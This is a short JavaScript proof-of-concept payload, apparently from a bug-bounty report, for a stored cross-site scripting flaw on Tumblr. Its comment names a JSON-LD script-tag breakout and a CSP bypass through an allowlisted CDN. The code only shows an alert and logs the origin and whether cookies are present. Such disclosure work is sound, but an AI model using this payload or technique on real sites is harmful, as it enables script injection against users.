/* Tumblr stored-XSS PoC payload, served via cdn.jsdelivr.net (allowlisted in Tumblr CSP).
   Benign: single alert identifying the executing origin. Author: ty5ona (bug bounty). */
try {
  alert('Tumblr stored XSS (JSON-LD </script> breakout) — executing on ' + document.domain);
  console.log('[POC] executed on', location.origin, 'cookies present:', document.cookie.length > 0);
} catch (e) {}
